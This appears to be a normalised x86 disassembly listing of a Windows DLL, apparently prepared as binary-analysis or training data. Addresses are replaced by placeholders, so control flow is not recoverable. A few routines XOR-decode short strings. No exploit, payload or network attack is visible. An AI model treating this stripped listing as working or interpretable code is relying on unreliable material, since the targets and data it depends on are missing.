call sub_10032529
leave
retn
push 0x3
call sub_1003e2e4
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1003e2e4
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_10001023
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_1007fa40
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1005aa2b
push esi
call sub_10010de5
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_10001023
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_10002b23
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_10010de5
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_1005bc2f
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_10002b23
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_1005f95d
add esp 0xc
jmp r-xdata
sub_100539c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x4 ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ecx
call sub_1007ec40
mov eax [ ebp + 0x8 ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffc
mov [ edi ] eax
mov eax edi
pop ebp
retn 0x4
sub_100539f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088ffd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
mov edi ecx
xor ebx ebx
push ebx
mov [ ebp - 0x2fc ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x218 ]
push ebx
push ecx
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10063850
test eax eax
je r-xdata
mov [ ebp - 0x4 ] esi
mov edi [ ebp - 0x2e0 ]
cmp edi ebx
je r-xdata
or esi 0xffffffff
mov [ ebp - 0x4 ] esi
push eax
lea ecx [ ebp - 0x2e4 ]
mov [ ebp - 0x2e4 ] ebx
mov [ ebp - 0x2e0 ] ebx
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2e4 ] ebx
jne r-xdata
push 0x1
call sub_1002e3ac
add esp 0x4
push eax
lea ecx [ ebp - 0x2ec ]
mov [ ebp - 0x2ec ] ebx
mov [ ebp - 0x2e8 ] ebx
call sub_10002ce0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x2ec ] ebx
jne r-xdata
mov [ ebp - 0x4 ] esi
mov edi [ ebp - 0x2e0 ]
cmp edi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ edi + 0x4 ]
mov ecx esi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea ecx [ ebp - 0x2e4 ]
call sub_1001ee70
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10039fc0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ edi + 0x4 ]
mov eax esi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
[ ecx ] esi
jne r-xdata
mov ebx [ ebp - 0x2e4 ]
call sub_10011800
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10039fc0
mov eax 0x4
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
[ ecx ] esi
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_10039fc0
mov eax 0x5
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
mov eax edi
mov eax [ edi ]
jmp r-xdata
push eax
call ebx
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x2f0 ] eax
call sub_100702e0
lea ecx [ ebp - 0x26c ]
call sub_100702e0
lea ecx [ ebp - 0x2a4 ]
call sub_100702e0
xor ecx ecx
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
mov [ ebp - 0x234 ] cx
mov edi [ ebp - 0x2fc ]
push 0xffffffff
push ecx
lea edx [ edi + 0x3c ]
push edx
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x4 ] 0x5
call sub_1002d970
push 0xffffffff
push 0x0
lea eax [ edi + 0x58 ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_1006da10
mov eax [ ebp - 0x234 ]
cmp [ ebp - 0x220 ] esi
jae r-xdata
mov eax [ eax ]
mov ebx [ SysAllocString@IAT ]
push eax
call ebx
movzx edx [ edi + 0x38 ]
push edx
lea esi [ ebp - 0x2a4 ]
mov [ ebp - 0x300 ] eax
call sub_1001ddf0
add esp 0x4
mov esi eax
push r--data
add edi 0x1c
lea eax [ ebp - 0x26c ]
push edi
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100609f0
add esp 0xc
mov ecx eax
mov eax esi
lea edi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x4
call sub_1006b070
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call ebx
push r--data
mov [ ebp - 0x2f4 ] eax
call ebx
movzx ecx [ edi + 0x74 ]
push ecx
lea esi [ ebp - 0x2c0 ]
mov [ ebp - 0x2f8 ] eax
call sub_1001ddf0
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x234 ]
push eax
call ebx
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x304 ] eax
call sub_100702e0
mov edx [ edi + 0x78 ]
push edx
lea esi [ ebp - 0x2dc ]
call sub_1001ddf0
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x2dc ]
mov edi eax
call sub_100702e0
mov eax [ ebp - 0x2fc ]
mov ecx [ eax + 0x7c ]
push ecx
lea esi [ ebp - 0x288 ]
call sub_1001ddf0
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
push eax
call ebx
lea ecx [ ebp - 0x288 ]
mov esi eax
call sub_100702e0
mov ebx [ ebp - 0x304 ]
mov edx [ ebp - 0x2f0 ]
mov eax [ ebp - 0x300 ]
mov ecx [ ebp - 0x2f4 ]
push esi
push edi
push ebx
push edx
mov edx [ ebp - 0x2f8 ]
push eax
lea esi [ ebp - 0x328 ]
call sub_100218e0
mov ecx [ ebp - 0x300 ]
mov [ ebp - 0x4 ] 0x6
mov esi [ SysFreeString@IAT ]
push ecx
call esi
mov edx [ ebp - 0x2f0 ]
push edx
call esi
mov eax [ ebp - 0x2f4 ]
push eax
call esi
mov ecx [ ebp - 0x2f8 ]
push ecx
call esi
push ebx
call esi
push edi
call esi
mov eax [ ebp - 0x2e4 ]
lea edx [ ebp - 0x328 ]
add eax 0x128
push edx
call sub_10057520
lea ecx [ ebp - 0x2e4 ]
call sub_1002bf80
test eax eax
lea eax [ ebp - 0x328 ]
je r-xdata
mov eax [ eax ]
call sub_10063d70
lea ecx [ ebp - 0x234 ]
call sub_100702e0
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
xor eax eax
call sub_10063d70
lea ecx [ ebp - 0x234 ]
call sub_100702e0
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax 0x6
jmp r-xdata
sub_10053ea0
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10053ef5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_1005bae3
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_10053f25
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10021e27
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10053fd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_1003afd0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + edi ] 0x0
mov esi [ esi ]
sub_10054010
push ebp
mov ebp esp
push 0xffffffff
push sub_100862c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xc8
call sub_10069020
push esi
lea edx [ ebp - 0xac ]
lea ecx [ ebp - 0x3c ]
call sub_10020e20
test eax eax
jne r-xdata
lea esi [ ebp - 0xbc ]
call sub_100299a0
lea esi [ ebp - 0xb4 ]
call sub_100299a0
lea esi [ ebp - 0xac ]
call sub_100299a0
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xf3
call sub_10069020
push esi
lea edx [ ebp - 0xb4 ]
lea ecx [ ebp - 0xa4 ]
call sub_10020e20
test eax eax
jne r-xdata
mov eax [ ebp - 0xac ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x116
call sub_10069020
push esi
lea edx [ ebp - 0xbc ]
lea ecx [ ebp - 0x70 ]
call sub_10020e20
test eax eax
jne r-xdata
mov eax [ ebp - 0xb4 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
lea esi [ ebp - 0xbc ]
call sub_100299a0
lea esi [ ebp - 0xb4 ]
call sub_100299a0
lea esi [ ebp - 0xac ]
call sub_100299a0
xor eax eax
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_100299a0
lea esi [ ebp - 0xb4 ]
call sub_100299a0
lea esi [ ebp - 0xac ]
call sub_100299a0
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_100299a0
lea esi [ ebp - 0xb4 ]
call sub_100299a0
lea esi [ ebp - 0xac ]
call sub_100299a0
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea esi [ ebp - 0xbc ]
call sub_100299a0
lea esi [ ebp - 0xb4 ]
call sub_100299a0
lea esi [ ebp - 0xac ]
call sub_100299a0
mov eax 0x4
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_100542b0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_10033f90
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100542e0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
push esi
mov esi ecx
movsx ecx [ eax ]
xor ecx 0xffc4
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_1005bf30
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x70 ]
call sub_10034100
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10054390
push 0x4c
mov eax sub_1008557e
call sub_10047689
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx edi
mov [ ebp - 0x48 ] ebx
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1004aa10
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
call sub_1002be90
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10026407
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ edi + 0x24 ] 0x0
mov eax [ edi + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
and [ ebp - 0x30 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x58 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1000650a
mov ecx [ eax ]
push [ ebp - 0x30 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x3c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x44 ]
mov [ ebp + 0x14 ] eax
push ebx
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call sub_10057eeb
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax [ ebp - 0x44 ]
call sub_100262c3
retn
cmp eax 0x100
lea eax [ ebp - 0x4c ]
je r-xdata
cmp eax [ ebp - 0x34 ]
jbe r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_100190f9
mov ecx [ eax ]
push [ ebp - 0x30 ]
add esi [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x4c ]
push eax
push ebx
call sub_10057eeb
add esp 0x30
push [ ebp - 0x30 ]
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_10057eeb
add esp 0x18
jmp r-xdata
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x30 ] 0x0
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov ebx [ ebp - 0x34 ]
jmp r-xdata
test al al
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx ebx
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub ebx eax
mov eax [ ebp - 0x34 ]
sub eax ebx
inc eax
push eax
lea ecx [ esi + ebx ]
push ecx
push eax
lea eax [ esi + ebx + 0x1 ]
push eax
mov [ ebp - 0x54 ] ecx
call sub_10061520
mov eax [ ebp - 0x54 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp - 0x34 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x30 ] eax
sub_1005459b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_100495e4
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1004067f
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_10054650
push ebp
mov ebp esp
push 0xffffffff
push sub_10088548
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi ecx
mov ecx [ eax ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax ecx
mov esi edx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x68 ] edx
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax [ ebp - 0x68 ]
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10034100
lea eax [ ebp - 0x2c ]
mov edx esi
push eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x0
call sub_10040e00
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
add esp 0x8
push 0xffffffff
xor ebx ebx
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_1006da10
mov esi 0x8
cmp [ ebp - 0x34 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
sub_10054770
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a0c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8c ] 0x7
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] cx
push edx
mov [ ebp - 0x4 ] ecx
push eax
mov ecx rw-data
mov edi rw-data
call sub_1000f5b0
test eax eax
je r-xdata
push rw-data
call sub_1004e370
mov esi eax
test esi esi
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x68 ]
mov eax 0x86
call sub_10069020
lea eax [ ebp - 0xbc ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x68 ]
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x1
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x4
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor edx edx
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] dx
cmp [ ebp - 0xa8 ] esi
jb r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1000a86e
add esp 0x4
sub_100548a0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0x54 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x57
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x5c ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0xe8 ]
call sub_10034100
mov ecx [ ebp - 0x5c ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0x54 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0x50 ]
mov eax 0xe6
